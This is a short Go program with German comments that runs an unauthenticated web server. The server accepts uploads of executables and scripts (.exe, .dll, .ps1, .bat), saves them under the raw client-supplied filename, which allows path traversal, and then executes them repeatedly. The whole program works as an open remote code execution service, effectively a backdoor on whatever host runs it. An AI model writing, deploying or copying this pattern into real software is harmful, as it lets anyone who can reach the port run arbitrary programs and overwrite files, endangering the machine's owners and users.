package main

import (
    "fmt"
    "net/http"
    "os"
    "os/exec"
    "io"
    "path/filepath"
    "strings"
    "time"
)

func main() {
    // Überprüfen, ob das Upload-Verzeichnis existiert, und es erstellen, wenn es nicht existiert
    uploadDir := "./uploads"
    if _, err := os.Stat(uploadDir); os.IsNotExist(err) {
        os.Mkdir(uploadDir, os.ModePerm)
    }

    http.HandleFunc("/", uploadHandler)
    http.ListenAndServe(":8080", nil)
}

func uploadHandler(w http.ResponseWriter, r *http.Request) {
    if r.Method == "POST" {
        file, header, err := r.FormFile("file")
        if err != nil {
            http.Error(w, err.Error(), http.StatusInternalServerError)
            return
        }
        defer file.Close() // Datei schließen, wenn die Funktion beendet ist

        fileName := header.Filename
        // Prüfen, ob die Dateiendung in der Liste erlaubter Endungen ist
        allowedExtensions := []string{".exe", ".dll", ".ps1", ".bat"}
        ext := strings.ToLower(filepath.Ext(fileName))
        allowed := false
        for _, allowedExt := range allowedExtensions {
            if ext == allowedExt {
                allowed = true
                break
            }
        }

        if !allowed {
            http.Error(w, "Ungültige Dateiendung", http.StatusBadRequest)
            return
        }

        // Speichern der hochgeladenen Datei auf dem Server
        outputPath := "./uploads/" + fileName
        outFile, err := os.Create(outputPath)
        if err != nil {
            http.Error(w, err.Error(), http.StatusInternalServerError)
            return
        }
        defer outFile.Close() // Datei schließen, wenn die Funktion beendet ist

        _, err = io.Copy(outFile, file)
        if err != nil {
            http.Error(w, err.Error(), http.StatusInternalServerError)
            return
        }

        // Warten, bis die Datei freigegeben ist
        for i := 0; i < 10; i++ { // Versuche 10 Mal, die Datei auszuführen
            cmd := exec.Command(outputPath)
            err := cmd.Run()
            if err == nil {
                // Die Ausführung war erfolgreich
                fmt.Fprintf(w, "Die Datei wurde erfolgreich ausgeführt.")
                return
            }

            // Wenn die Ausführung fehlschlägt, warte kurz und versuche es erneut
            time.Sleep(1 * time.Second)
        }

        http.Error(w, "Die Datei konnte nicht ausgeführt werden", http.StatusInternalServerError)
    } else {
        // HTML-Formular zur Dateiübertragung anzeigen
        html := `
            <html>
                <body>
                    <form enctype="multipart/form-data" action="/" method="post">
                        <input type="file" name="file" />
                        <input type="submit" value="Hochladen und Ausführen" />
                    </form>
                </body>
            </html>
        `
        fmt.Fprint(w, html)
    }
}
